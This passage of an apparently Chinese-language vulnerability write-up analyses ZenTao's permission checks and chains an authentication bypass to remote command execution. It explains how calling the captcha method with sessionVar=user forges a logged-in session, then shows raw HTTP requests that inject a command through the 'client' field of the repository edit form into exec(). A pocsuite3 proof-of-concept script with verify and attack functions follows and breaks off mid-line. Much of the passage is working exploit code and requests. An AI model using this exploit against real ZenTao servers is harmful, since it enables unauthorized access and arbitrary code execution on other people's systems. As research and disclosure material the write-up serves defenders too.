class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">获取模块、方法<br><br><span class="hljs-keyword">if</span>判断 获取不到<br>  就获取原始模块、方法<br><br>定义了一个变量中含有三个数组  <br>  user -&gt; <span class="hljs-string">&#x27;拒绝&#x27;</span>，<span class="hljs-string">&#x27;注销&#x27;</span><br>  my  -&gt; <span class="hljs-string">&#x27;更改密码&#x27;</span><br><span class="hljs-string">&#x27;message&#x27;</span> -&gt; ajax获取信息<br><br><span class="hljs-keyword">if</span> 判断 <br>  检查modifyPassword变量是否为空 并且 <br>  检查$beforeValidMethods[$module]变量是否设置并为空 或者 <br>  检查$beforeValidMethods数组中是否存在方法<br><br><span class="hljs-keyword">if</span> 判断<br>  判断用户是否登录。$server来获取用户和$_cookie识别用户<br><br><span class="hljs-keyword">if</span> 判断模块是否开放？<br><br><span class="hljs-keyword">if</span> 判断 <br>  this-&gt;app-&gt;user 非空<br><br>  进行一个赋值<br>  ！$this-&gt;app-&gt;user = $this-&gt;session-&gt;user;<br><br>  <span class="hljs-keyword">if</span> 判断<br>      检查用户是否可以访问X模块、X方法权限，检查是否为正确的session<br>  用户session判断为非（错误用户），进入下一步判断。<br>   <span class="hljs-keyword">if</span> 判断<br>   模块 == <span class="hljs-string">&#x27;story&#x27;</span> 和 url传递参数(<span class="hljs-string">&#x27;storytype&#x27;</span>) 非空 和 查找字符串(<span class="hljs-string">&#x27;,story,requirement,&#x27;</span>，&#123;$this-&gt;app-&gt;params[<span class="hljs-string">&#x27;storyType&#x27;</span>]&#125;判断字符串在多少位 url参数中查询) 查询结果要等与 ==<span class="hljs-literal">true</span><br>           模块 = $this-&gt;app-&gt;params[<span class="hljs-string">&#x27;storyType&#x27;</span>]<br>       调用 deny方法($module,$method)<br>  <span class="hljs-comment">//判断 session正确 正常执行下面流程</span><br>  <span class="hljs-keyword">else</span> <br>  获取原始请求以及参数<br><span class="hljs-keyword">if</span> 如果模块等于<span class="hljs-string">&#x27;message&#x27;</span>和方法等于<span class="hljs-string">&#x27;ajaxgetmessage&#x27;</span><br>uri = 访问模块链接<br>elseif 检查是否为ajax请求，<span class="hljs-number">301</span>跳转<br>           返回结果信息为<span class="hljs-literal">false</span>，错误 login timetou，并退出当前脚本<br>将原始请求、参数转换为安全的base64编码<br><span class="hljs-comment">//跳转到指定页面，user-&gt;login方法，并推出当前脚本。</span><br><br><span class="hljs-comment">//异常处理</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">    public function <span class="hljs-title function_">mergeParams</span><span class="hljs-params">($defaultParams, $passedParams)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">&#x27;project&#x27;</span>])) $this-&gt;session-&gt;<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;project&#x27;</span>, $_GET[<span class="hljs-string">&#x27;project&#x27;</span>]);<br>        <span class="hljs-comment">/* If the isFlow is true, reset the passed params. */</span><br><br>        <span class="hljs-comment">/* display参数用来标记请求是否来自禅道客户端的卡片展示页面，此处应该删掉以避免对方法调用产生影响。 */</span><br>        <span class="hljs-comment">/* The display parameter is used to mark whether the request comes from the card display page of the ZenTao client. It should be deleted here to avoid affecting the method call. */</span><br>        unset($passedParams[<span class="hljs-string">&#x27;display&#x27;</span>]);<br><br>        $this-&gt;rawParams = parent::mergeParams($defaultParams, $passedParams);<br>        <span class="hljs-keyword">return</span> $this-&gt;rawParams;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">按PHP_AUTH_USER识别用户。<br>public function identifyByPhpAuth()<br>    &#123;<br>        $account  = $this-&gt;server-&gt;php_auth_user;<br>        $password = $this-&gt;server-&gt;php_auth_pw;<br>        $user     = $this-&gt;identify($account, $password);<br>        <span class="hljs-keyword">if</span>(!$user) <span class="hljs-keyword">return</span> false;<br><br>        $user-&gt;rights = $this-&gt;authorize($account);<br>        $user-&gt;groups = $this-&gt;getGroups($account);<br>        $user-&gt;view   = $this-&gt;grantUserView($user-&gt;account, $user-&gt;rights[<span class="hljs-string">&#x27;acls&#x27;</span>]);<br>        $this-&gt;session-&gt;<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;user&#x27;</span>, $user);<br>        $this-&gt;app-&gt;user = $this-&gt;session-&gt;user;<br>        $this-&gt;loadModel(<span class="hljs-string">&#x27;action&#x27;</span>)-&gt;create(<span class="hljs-string">&#x27;user&#x27;</span>, $user-&gt;<span class="hljs-built_in">id</span>, <span class="hljs-string">&#x27;login&#x27;</span>);<br>        $this-&gt;loadModel(<span class="hljs-string">&#x27;score&#x27;</span>)-&gt;create(<span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;login&#x27;</span>);<br>        $this-&gt;loadModel(<span class="hljs-string">&#x27;common&#x27;</span>)-&gt;loadConfigFromDB();<br>    &#125;<br><br>$account 获取user<br>$password 获取密码<br><br>identify 标识用户<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">public function identify($account, $password)<br>    &#123;<br>        // 非空返回<br>        <span class="hljs-keyword">if</span>(!$account <span class="hljs-keyword">or</span> !$password) <span class="hljs-keyword">return</span> false;<br>        /* Check account rule <span class="hljs-keyword">in</span> login.  */<br><br>        <span class="hljs-keyword">if</span>(!validater::checkAccount($account)) <span class="hljs-keyword">return</span> false;<br><br>        /* Get the user first. If $password length <span class="hljs-keyword">is</span> <span class="hljs-number">32</span>, don<span class="hljs-string">&#x27;t add the password condition.  */</span><br><span class="hljs-string">        $record = $this-&gt;dao-&gt;select(&#x27;</span>*<span class="hljs-string">&#x27;)-&gt;from(TABLE_USER)</span><br><span class="hljs-string">            -&gt;where(&#x27;</span>account<span class="hljs-string">&#x27;)-&gt;eq($account)</span><br><span class="hljs-string">            -&gt;beginIF(strlen($password) &lt; 32)-&gt;andWhere(&#x27;</span>password<span class="hljs-string">&#x27;)-&gt;eq(md5($password))-&gt;fi()</span><br><span class="hljs-string">            -&gt;andWhere(&#x27;</span>deleted<span class="hljs-string">&#x27;)-&gt;eq(0)</span><br><span class="hljs-string">            -&gt;fetch();</span><br><span class="hljs-string"></span><br><span class="hljs-string">        /* If the length of $password is 32 or 40, checking by the auth hash. */</span><br><span class="hljs-string">        $user = false;</span><br><span class="hljs-string"></span><br><span class="hljs-string">checkAccount 检查用户名</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//拒绝访问 方法。</span><br>public function <span class="hljs-title function_">deny</span><span class="hljs-params">($module, $method, $reload = <span class="hljs-literal">true</span>)</span><br><span class="hljs-keyword">if</span> 判断<span class="hljs-params">(<span class="hljs-literal">true</span>)</span><br>   <span class="hljs-comment">//再次获得授权</span><br>$user = $this-&gt;app-&gt;user;<br>$user-&gt;权限<br>进行一些赋值，并检查用户是否允许方法模块、方法、检查session是否正确。<br>    进行一个 referer 返回<br>    修复 ie bug<br>    跳转指定地址<br>    终止并输出，不同于 <span class="hljs-built_in">exit</span>，die。<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">总结一下：权限验证模块<br>主要处的问题再 deny方法<br>      helper::end();<br>public <span class="hljs-type">static</span> function <span class="hljs-title function_">end</span><span class="hljs-params">($content = <span class="hljs-string">&#x27;&#x27;)</span></span><br><span class="hljs-string"><span class="hljs-params">    &#123;</span></span><br><span class="hljs-string"><span class="hljs-params">        // 触法异常 EndResponseException（结束响应异常）类::create 方法</span></span><br><span class="hljs-string"><span class="hljs-params">        throw EndResponseException::create($content);</span></span><br><span class="hljs-string"><span class="hljs-params">    &#125;</span></span><br><span class="hljs-string"><span class="hljs-params">没有权限 将会使用 helper::end 抛出异常，不是为 die或exit()程序</span></span><br><span class="hljs-string"><span class="hljs-params">跳到 异常处理 catch</span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">利用：</span></span><br><span class="hljs-string"><span class="hljs-params">  首先保证  $this-&gt;app-&gt;user = $this-&gt;session-&gt;user; 不为空，session的正确</span></span><br><span class="hljs-string"><span class="hljs-params">  然后回检查用户是否被允许访问该模块、方法</span></span><br><span class="hljs-string"><span class="hljs-params">  </span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">漏洞利用关键点：找一个可以生成session-&gt;user 的方法</span></span><br></code></pre></td></tr></table></figure><p>搜索 <code>$this-&gt;session-&gt;user</code>，未找到可以调用方法，搜索<code>$this-&gt;session-&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1677676631068-f08d744d-c673-4df6-8803-4790d0707e52.png" alt="image.png"><br>找到一个 <code>$this-&gt;session-&gt;set</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">captcha</span>(<span class="hljs-params"><span class="hljs-variable">$sessionVar</span> = <span class="hljs-string">&#x27;captcha&#x27;</span>, <span class="hljs-variable">$uuid</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$obLevel</span> = <span class="hljs-title function_ invoke__">ob_get_level</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$obLevel</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: image/jpeg&#x27;</span>);<br>        <span class="hljs-variable">$captcha</span> = <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">loadClass</span>(<span class="hljs-string">&#x27;captcha&#x27;</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;session-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$sessionVar</span>, <span class="hljs-variable">$captcha</span>-&gt;<span class="hljs-title function_ invoke__">getPhrase</span>());<br>        <span class="hljs-variable">$captcha</span>-&gt;<span class="hljs-title function_ invoke__">build</span>()-&gt;<span class="hljs-title function_ invoke__">output</span>();<br>    &#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">GET /www/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&amp;t=html&amp;s=<span class="hljs-number">0.8135980060049282</span> HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.15</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">103.0</span><span class="hljs-number">.5060</span><span class="hljs-number">.53</span> Safari/<span class="hljs-number">537.36</span><br>Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=<span class="hljs-number">0.8</span><br>Referer: http://<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.15</span>/www/index.php?m=user&amp;f=login&amp;referer=L3d3dy8=<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Cookie: zentaosid=potlgh6aolbfrs3jrssu0pjchr; lang=zh-cn; device=desktop; theme=default; windowWidth=<span class="hljs-number">1707</span>; windowHeight=<span class="hljs-number">904</span><br>Connection: close<br><br><br><br></code></pre></td></tr></table></figure><p>根据曝光出来的后台RCE接口确认地址<br><code>repo/control.php-&gt;edit()</code>调用了<code>update()</code>调用了<code>checkConnection()</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1677811778234-41bc05dd-1c12-434c-a7f7-02c7b1ceee84.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1677822057470-ae292253-0689-4181-9e9d-8dba765b1898.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1677822076906-6aa7a539-666c-4bbd-8b56-c43ee0d71bb8.png" alt="image.png"></p><p>首先先分析<code>edit()</code>方法对应的是什么功能<br>对应后台<code>DevOps</code>代码库功能<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1677822884643-9aeb3f74-04c7-4bc3-9ed9-bdbc7d1a4f38.png" alt="image.png"><br>创建一个代码库<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1677831176213-348f75bb-a919-471d-b558-c8a75668d601.png" alt="image.png"></p><p>利用点是编辑代码库功能<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1677831238407-fd3bb5ff-d610-463b-b7c3-e136cff09f20.png" alt="image.png"><br>打上断点，跟进代码里<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1677831268386-6722f46f-4857-453f-97c8-7ae7726b3d39.png" alt="image.png"><br>一直到<code>checkConnection()</code>方法，对<code>$scm == &#39;Subversion&#39;</code>进行判断<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1677831321168-432e61b6-f8a3-48d3-95eb-1574643f6c16.png" alt="image.png"></p><p>我们修改<code>scm</code>的值，让它进入判断里面，执行这段代码，操纵<code>client</code>变量达到<code>exec</code>进行命令执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>($scm == <span class="hljs-string">&#x27;Subversion&#x27;</span>)<br>       &#123;<br>           <span class="hljs-comment">/* Get svn version. */</span><br>           $versionCommand = <span class="hljs-string">&quot;$client --version --quiet 2&gt;&amp;1&quot;</span>;<br>           exec($versionCommand, $versionOutput, $versionResult);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1677831505037-05d66adb-2451-4015-aebc-c92bd3d5bf41.png" alt="image.png"><br>成功执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">POST /www/index.php?m=repo&amp;f=edit&amp;repoID=&amp;objectID= HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.15</span><br>Content-Length: <span class="hljs-number">182</span><br>Accept: application/json, text/javascript, *<span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">Origin: http://192.168.3.15</span><br><span class="hljs-comment">Referer: http://192.168.3.15/www/index.php?m=repo&amp;f=edit&amp;repoID=1&amp;objectID=0</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Cookie: lang=zh-cn; theme=default; goback=%7B%22my%22%3A%22http%3A%5C%2F%5C%2F192.168.3.15%5C%2Fwww%5C%2Findex.php%3Fm%3Duser%26f%3Dlogin%26referer%3DL3d3dy8%3D%22%2C%22project%22%3A%22http%3A%5C%2F%5C%2F192.168.3.15%5C%2Fwww%5C%2Findex.php%3Fm%3Dproject%26f%3Dbrowse%22%2C%22admin%22%3A%22http%3A%5C%2F%5C%2F192.168.3.15%5C%2Fwww%5C%2Findex.php%3Fm%3Dcompany%26f%3Dbrowse%22%7D; zentaosid=viln6ta833u2ibkji9d4hockph; device=desktop; tab=devops; repoBranch=master; windowWidth=1611; windowHeight=908; XDEBUG_SESSION=PHPSTORM</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">product%5B%5D=&amp;projects%5B%5D=&amp;SCM=Subversion&amp;serviceHost=&amp;name=q&amp;path=&amp;encoding=&amp;client=calc.exe&amp;account=&amp;password=&amp;encrypt=&amp;acl%5Bgroups%5D%5B%5D=1&amp;acl%5Busers%5D%5B%5D=&amp;desc=&amp;uid=</span><br></code></pre></td></tr></table></figure><h3 id="poc编写"><a href="#poc编写" class="headerlink" title="poc编写"></a>poc编写</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1679578008273-a59de053-876a-4e26-8487-60f5ff4cf64e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1679578038199-f97336cf-76ff-4a0e-aa1b-5e3bfb4d4427.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">from</span> pocsuite3.api <span class="hljs-keyword">import</span> Output, POCBase, register_poc, requests, logger, OptString<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> OrderedDict<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoPOC</span>(<span class="hljs-title class_ inherited__">POCBase</span>):<br>    vulID = <span class="hljs-string">&quot;xxxx&quot;</span>  <span class="hljs-comment"># ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span><br>    version = <span class="hljs-string">&quot;1&quot;</span>  <span class="hljs-comment"># 默认为1</span><br>    author = <span class="hljs-string">&quot;spike&quot;</span>  <span class="hljs-comment"># PoC作者的大名</span><br>    vulDate = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># 漏洞公开的时间,不知道就写今天</span><br>    createDate = <span class="hljs-string">&quot;2022-07-17&quot;</span>  <span class="hljs-comment"># 编写 PoC 的日期</span><br>    updateDate = <span class="hljs-string">&quot;2022-07-17&quot;</span>  <span class="hljs-comment"># PoC 更新的时间,默认和编写时间一样</span><br>    references = [<span class="hljs-string">&quot;https://xxx.xx.com.cn&quot;</span>]  <span class="hljs-comment"># 漏洞地址来源,0day不用写</span><br>    name = <span class="hljs-string">&quot;禅道后台任意文件上传 upload&quot;</span>  <span class="hljs-comment"># PoC 名称</span><br>    appPowerLink = <span class="hljs-string">&quot;https://www.zentao.net/&quot;</span>  <span class="hljs-comment"># 漏洞厂商主页地址</span><br>    appName = <span class="hljs-string">&quot;zentao&quot;</span>  <span class="hljs-comment"># 漏洞应用名称</span><br>    appVersion = <span class="hljs-string">&quot;...&quot;</span>  <span class="hljs-comment"># 漏洞影响版本</span><br>    vulType = <span class="hljs-string">&#x27;File Upload&#x27;</span>  <span class="hljs-comment"># 漏洞类型,类型参考见 漏洞类型规范表</span><br>    samples = [<span class="hljs-string">&#x27;&#x27;</span>]  <span class="hljs-comment"># 测试样列,就是用 PoC 测试成功的网站</span><br>    install_requires = [<span class="hljs-string">&#x27;&#x27;</span>]  <span class="hljs-comment"># PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span><br>    <br>    <br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_options</span>(<span class="hljs-params">self</span>):<br>        o = OrderedDict()<br>        o[<span class="hljs-string">&quot;cmd&quot;</span>] = OptString(<span class="hljs-string">&#x27;clase&#x27;</span>, description=<span class="hljs-string">&#x27;要执行的php代码&#x27;</span>, require=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> o<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_exploit</span>(<span class="hljs-params">self, param=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._check(dork=<span class="hljs-string">&#x27;&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#x27;</span><br>        &#125;<br><br>        session = requests.session()<br>        captcha_url = <span class="hljs-string">&#x27;/www/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;</span><br>        <span class="hljs-comment">#html_url = &#x27;/zentao/misc-captcha-user.html&#x27;</span><br>        my_url = <span class="hljs-string">&#x27;/www/index.php?m=my&amp;f=team&#x27;</span><br>        <span class="hljs-comment">#html_my_url = &#x27;/zentao/my-team.html&#x27;</span><br><br>        <span class="hljs-comment">#session_rep = session.get(url=self.url + captcha_url,headers=headers)</span><br>        session_rep = session.get(url=self.url + captcha_url, headers=headers)<br>        my_rep = session.get(url=self.url + my_url, headers=headers)<br><br><br>        logger.debug(my_rep)<br>        <span class="hljs-keyword">return</span> my_rep<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_verify</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        param = <span class="hljs-string">&#x27;&#x27;</span><br>        res = self._exploit(param)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;td class=&#x27;c-id&#x27;&quot;</span> <span class="hljs-keyword">in</span> res.text <span class="hljs-keyword">and</span> res.status_code == <span class="hljs-number">200</span>:<br>            c_id = re.findall(<span class="hljs-string">&quot;td class=&#x27;c-id&#x27;&gt;(.*?)&lt;/td&gt;&quot;</span>,res.text)<br>            user = re.findall(<span class="hljs-string">&quot;&lt;td&gt;(.*?)&lt;/td&gt;&quot;</span>, res.text)<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = self.url<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;id&#x27;</span>] = c_id<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;user&#x27;</span>] = user<br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_attack</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        common = self.get_option(<span class="hljs-string">&#x27;cmd&#x27;</span>)<br>        url = self.url<br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#x27;</span><br>        &#125;<br>        session = requests.session()<br>        captcha_url = <span class="hljs-string">&#x27;/www/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;</span><br>        captcha_rep = session.get(url=url + captcha_url,headers=headers)<br><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#x27;</span>,<br>            <span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>,<br>            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,<br>            <span class="hljs-string">&#x27;Referer&#x27;</span>: url + <span class="hljs-string">&#x27;/www/index.php?m=repo&amp;f=create&amp;objectID=0&#x27;</span><br>        &#125;<br>        create_url = <span class="hljs-string">&#x27;/www/index.php?m=repo&amp;f=create&amp;objectID=0&#x27;</span><br><br>        data1 = <span class="hljs-string">&quot;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&quot;</span><br>        create_rep = session.post(url=self.url+create_url,data=data1,headers=headers);<br><br>        data2 = <span class="hljs-string">&quot;product[]=&amp;projects[]=&amp;SCM=Subversion&amp;serviceHost=&amp;name=q&amp;path=&amp;encoding=&amp;client=&quot;</span> + common +<span 